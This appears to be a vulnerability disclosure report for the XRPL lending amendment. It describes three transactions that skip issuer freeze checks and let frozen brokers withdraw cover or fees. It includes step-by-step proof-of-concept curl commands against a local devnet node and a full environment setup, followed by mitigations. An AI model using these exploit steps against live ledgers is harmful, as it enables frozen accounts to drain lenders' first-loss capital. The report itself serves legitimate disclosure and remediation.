# Title
High: Freeze enforcement gaps allow brokers to bypass issuer freezes and drain first-loss capital

# Description

## Brief/Intro
The XLS-66 lending flows rely on pseudo-accounts and multi-recipient sends to move broker cover, fees, and loan proceeds. Several transactions omit the standard `checkFreeze` guard before transferring assets to broker owners or arbitrary destinations, only checking for deep-freeze (or not checking at all). Issuers can set `lsfLowFreeze/lsfHighFreeze` to quarantine a broker, but these gaps let frozen owners continue siphoning first-loss capital or fees. I confirmed three distinct paths where issuer freezes are ignored: `LoanBrokerDelete`, `LoanBrokerCoverWithdraw`, and `LoanSet` origination fee routing.

## Attack Scenario
1. Issuer freezes the broker owner’s trust line (or a collaborator’s) for the vault asset; deep-freeze is **not** required.
2. Broker maintains sufficient cover or loans so normal predicates pass.
3. The broker executes one of the flawed transactions:
   - Deletes the broker object to cash out `sfCoverAvailable`.
   - Withdraws cover to a frozen destination via `LoanBrokerCoverWithdraw`.
   - Originates a loan with a `LoanOriginationFee`, which still pays the frozen owner.
4. Each path transfers funds despite the freeze, enabling direct extraction of first-loss capital or fees that should remain locked.

## Finding 1 — `LoanBrokerDelete` bypasses issuer freeze on broker owner
**Severity:** High  
**Impact:** Direct cover drainage despite issuer-imposed freeze

### Vulnerability Details
- `LoanBrokerDelete::preclaim` verifies only ownership and that `sfOwnerCount == 0`; it never invokes `checkFreeze`/`checkDeepFrozen` on the owner before deletion.【F:src/xrpld/app/tx/detail/LoanBrokerDelete.cpp†L39-L63】
- `LoanBrokerDelete::doApply` unconditionally calls `accountSend` to move the entire `sfCoverAvailable` from the pseudo-account to the owner.【F:src/xrpld/app/tx/detail/LoanBrokerDelete.cpp†L103-L114】
- `checkFreeze` enforces `lsfLowFreeze/lsfHighFreeze` issuer freezes, while `checkDeepFrozen` only catches deep-freeze cases.【F:include/xrpl/ledger/View.h†L287-L314】 With no guard in place, the owner receives funds even when frozen.
- `accountSend` delegates to `rippleCreditIOU`, which assumes callers already performed freeze validation; it does not re-check trust line freeze flags.【F:src/libxrpl/ledger/View.cpp†L1908-L2049】
- The threat model explicitly highlights “Misuse of pseudo-accounts to circumvent recipient freeze checks,” making this a direct violation of expected controls.【F:THREAT_MODEL.md†L45-L116】

### Impact Details
- Issuers rely on freezes to quarantine bad brokers. This path allows a frozen broker owner to delete the broker and withdraw all cover, depriving lenders of first-loss capital.
- Loss magnitude equals full `sfCoverAvailable`, so impact is “Drainage and/or stealing of funds from ledger objects (vault, first loss capital).”

### Proof of Concept
1. Follow the consolidated setup below to create the issuer, broker, borrower, vault, and frozen trust line.
2. Submit the `LoanBrokerDelete` transaction:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerDelete",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"<BROKER_ID>"
       }
     }]
   }' | jq '.result.engine_result'
   ```
3. Query the broker ledger entry (`ledger_entry` with `index:"<BROKER_ID>"`). `sfCoverAvailable` drops to zero and the frozen owner trust line balance increases.

## Finding 2 — `LoanBrokerCoverWithdraw` ignores issuer freeze on destination
**Severity:** High  
**Impact:** Frozen recipients can siphon cover and bypass quarantine

### Vulnerability Details
- `LoanBrokerCoverWithdraw::preclaim` runs `checkFrozen` on the pseudo-account (source) but **only** applies `checkDeepFrozen` to the destination account.【F:src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp†L100-L140】 Normal freeze flags are never checked.
- `doApply` performs either a direct `accountSend` (self-transfer/XRP) or a payment-engine call. Neither path introduces additional freeze validation, so the transfer succeeds for a merely frozen trust line.【F:src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp†L164-L200】【F:src/libxrpl/ledger/View.cpp†L1908-L2049】
- Because `checkDeepFrozen` catches only deep freezes, any standard issuer freeze is bypassed, contradicting the threat model’s requirement to honor freezes on broker cover flows.【F:include/xrpl/ledger/View.h†L287-L314】【F:THREAT_MODEL.md†L58-L111】

### Impact Details
- Broker owners (or accomplices) can set an issuer freeze and still route cover to themselves, draining FLC meant to absorb borrower defaults.
- Also enables targeted fund movements to frozen collaborators, undermining compliance and risk controls.

### Proof of Concept
1. With the issuer freeze still active, submit:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerCoverWithdraw",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"<BROKER_ID>",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"500000"
         },
         "Destination":"<BROKER_ACCOUNT>"
       }
     }]
   }' | jq '.result.engine_result'
   ```
2. The call returns `tesSUCCESS`. Inspect the destination trust line via `ledger_entry`; the frozen account receives the payment.

## Finding 3 — `LoanSet` origination fees ignore issuer freeze on broker owner
**Severity:** High  
**Impact:** Frozen owners collect origination fees from new loans

### Vulnerability Details
- `LoanSet::preclaim` calls `checkDeepFrozen(ctx.view, brokerOwner, asset)` but never invokes `checkFreeze`, so issuer `lsfLowFreeze/lsfHighFreeze` flags are ignored.【F:src/xrpld/app/tx/detail/LoanSet.cpp†L292-L318】
- When loans include `LoanOriginationFee`, `LoanSet::doApply` uses `accountSendMulti` to pay the owner and borrower simultaneously, without additional freeze enforcement.【F:src/xrpld/app/tx/detail/LoanSet.cpp†L520-L563】
- As in the previous findings, `accountSendMulti` ultimately depends on `rippleCreditIOU`, which assumes the caller validated freeze semantics.【F:src/libxrpl/ledger/View.cpp†L1908-L2153】
- The threat model classifies loan creation as a primary attack surface and warns about pseudo-account bypasses; this gap lets frozen owners continue extracting fees while quarantined.【F:THREAT_MODEL.md†L34-L86】

### Impact Details
- The vault’s first-loss capital drains via origination fees paid to an account explicitly frozen by the issuer. Lenders suffer the loss whenever defaults occur because the cover never increases to compensate.
- Freeze controls are effectively nullified during loan origination, weakening compliance guarantees.

### Proof of Concept
1. Keep the issuer freeze in effect and submit a `LoanSet` with a non-zero origination fee:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanSet",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"<BROKER_ID>",
         "Counterparty":"<BORROWER_ACCOUNT>",
         "PrincipalRequested":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"100000000"
         },
         "PaymentInterval":2419200,
         "PaymentTotal":12,
         "LoanOriginationFee":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000"
         }
       }
     }]
   }' | jq '.result.engine_result'
   ```
2. Inspect the owner trust line; the `+1000` credit posts even though the issuer froze the line.

# Impact
- **Financial loss:** Frozen brokers can extract first-loss capital and fees, directly reducing protection for lender funds.
- **Invariant breach:** Issuer freeze semantics—called out as critical controls in the threat model—are violated in multiple transactions.
- **Compliance risk:** Freezes meant to enforce sanctions or policy are ineffective, allowing quarantined accounts to continue value extraction.

# Recommended Mitigations
1. Invoke `checkFreeze` in addition to `checkDeepFrozen` for every pseudo-account → owner/destination transfer in lending transactions (`LoanBrokerDelete`, `LoanBrokerCoverWithdraw`, `LoanSet`, and analogues).
2. Centralize a helper (e.g., `enforceFreezeForTransfer(view, from, to, asset)`) and use it across fee routing, cover withdrawals, and deletion flows to avoid future gaps.
3. Extend regression tests to cover issuer freeze scenarios for lending transactions, ensuring both standard and deep freeze flags block payouts.

# Proof of Concept (Consolidated Environment)
The sequence below builds a devnet scenario that reproduces all three findings. Replace `<...>` placeholders with actual values returned by previous commands.

```sh
# 1. Create deterministic accounts (issuer, broker owner, borrower)
curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"issuer freeze demo"}]}'
curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"broker freeze demo"}]}'
curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"borrower freeze demo"}]}'

# 2. Fund each account from genesis
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"snoPBrXtMeMyMHUVTgbuqAfg1SUTb",
    "tx_json":{
      "TransactionType":"Payment",
      "Account":"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
      "Destination":"<ISSUER_ACCOUNT>",
      "Amount":"1000000000"
    }
  }]
}' | jq '.result.engine_result'
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"snoPBrXtMeMyMHUVTgbuqAfg1SUTb",
    "tx_json":{
      "TransactionType":"Payment",
      "Account":"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
      "Destination":"<BROKER_ACCOUNT>",
      "Amount":"1000000000"
    }
  }]
}' | jq '.result.engine_result'
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"snoPBrXtMeMyMHUVTgbuqAfg1SUTb",
    "tx_json":{
      "TransactionType":"Payment",
      "Account":"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
      "Destination":"<BORROWER_ACCOUNT>",
      "Amount":"1000000000"
    }
  }]
}' | jq '.result.engine_result'

# 3. Broker owner opens a trust line to the issuer asset
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"TrustSet",
      "Account":"<BROKER_ACCOUNT>",
      "LimitAmount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1000000000000"
      },
      "Flags":262144
    }
  }]
}' | jq '.result.engine_result'

# 4. Borrower consents to receive the same IOU
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BORROWER_SECRET>",
    "tx_json":{
      "TransactionType":"TrustSet",
      "Account":"<BORROWER_ACCOUNT>",
      "LimitAmount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1000000000000"
      }
    }
  }]
}' | jq '.result.engine_result'

# 5. Issuer supplies IOUs to the broker owner (seed for cover)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<ISSUER_SECRET>",
    "tx_json":{
      "TransactionType":"Payment",
      "Account":"<ISSUER_ACCOUNT>",
      "Destination":"<BROKER_ACCOUNT>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"500000000"
      },
      "Flags":131072
    }
  }]
}' | jq '.result.engine_result'

# 6. Broker creates a vault for the IOU asset
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"VaultCreate",
      "Account":"<BROKER_ACCOUNT>",
      "Asset":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>"
      },
      "Scale":6
    }
  }]
}' | jq '.result.tx_json.hash'

# 7. Fetch the newly created VaultID from transaction metadata
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"tx",
  "params":[{"transaction":"<VAULTCREATE_HASH>"}]
}' | jq '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex'

# 8. Configure the LoanBroker referencing that vault
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanBrokerSet",
      "Account":"<BROKER_ACCOUNT>",
      "VaultID":"<VAULT_ID>",
      "CoverRateMinimum":1
    }
  }]
}' | jq '.result.tx_json.hash'

# 9. Deposit first-loss capital into broker cover
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanBrokerCoverDeposit",
      "Account":"<BROKER_ACCOUNT>",
      "LoanBrokerID":"<BROKER_ID>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1000000"
      }
    }
  }]
}' | jq '.result.engine_result'

# 10. Issuer freezes the broker owner's trust line (tfSetFreeze = 1048576)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<ISSUER_SECRET>",
    "tx_json":{
      "TransactionType":"TrustSet",
      "Account":"<ISSUER_ACCOUNT>",
      "LimitAmount":{
        "currency":"USD",
        "issuer":"<BROKER_ACCOUNT>",
        "value":"0"
      },
      "Flags":1048576
    }
  }]
}' | jq '.result.engine_result'

# 11. Confirm the freeze flag is set
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"account_lines",
  "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
}' | jq '.result.lines[0].freeze'

# 12. Borrower prepares to take loans (optional but useful for LoanSet)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"account_info",
  "params":[{"account":"<BORROWER_ACCOUNT>"}]
}' | jq '.result.account_data.Sequence'
```

Executing the three transaction snippets in the individual Proof-of-Concept sections against this frozen environment reproduces each vulnerability.


